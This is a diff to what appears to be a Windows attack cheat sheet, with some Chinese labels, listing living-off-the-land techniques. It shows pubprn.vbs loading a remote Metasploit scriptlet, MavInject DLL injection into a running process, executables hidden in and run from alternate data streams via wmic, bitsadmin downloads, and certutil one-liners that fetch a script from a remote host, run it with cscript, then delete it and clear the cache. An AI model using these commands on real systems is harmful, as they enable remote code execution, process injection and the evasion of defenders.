@@ -252,7 +252,29 @@ netsh interface portproxy reset
 
 
 
-
-
+c:\Windows\System32\gatherNetworkInfo.vbs
+c:\Windows\System32\SyncAppvPublishingServer.vbs
 c:\windows\SysWOW64\cscript.exe c:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://10.51.90.203/lm/msf2.sct
-MavInject32.exe pid /INJECTRUNNING <PATH DLL>
+c:\Windows\System32\MavInject32.exe pid /INJECTRUNNING <PATH DLL>
+
+
+
+dir /r 查看
+type xx.exe > \\.\c:\test\nul:xx.exe
+wmic process call create \\.\c:\test\nul:xx.exe
+del \\.\C:\test\nul
+execute -iH -f "c:\\文件路径\\123:1.exe" -a "文件参数"
+
+
+
+
+bitsadmin /rawreturn /transfer getfile http://download.sysinternals.com/files/PSTools.zip c:\p.zip
+bitsadmin /rawreturn /transfer getpayload http://download.sysinternals.com/files/PSTools.zip c:\p.zip
+bitsadmin /transfer myDownLoadJob /download /priority normal "http://download.sysinternals.com/files/PSTools.zip" "c:\p.zip"
+
+certutil -urlcache -split -f http://192.168.254.102:80/a.txt b.txt
+certutil -urlcache -split -f http://192.168.254.102:80/a.txt delete
+
+certutil -urlcache -split -f http://192.168.254.102:80/a a.js && cscript a.js &&  del a.js && certutil -urlcache -split -f http://192.168.254.102:80/a delete
+certutil -urlcache -split -f http://192.168.254.102:80/abc a.vbs && cscript a.vbs &&  del a.vbs && certutil -urlcache -split -f http://192.168.254.102:80/abc delete
+
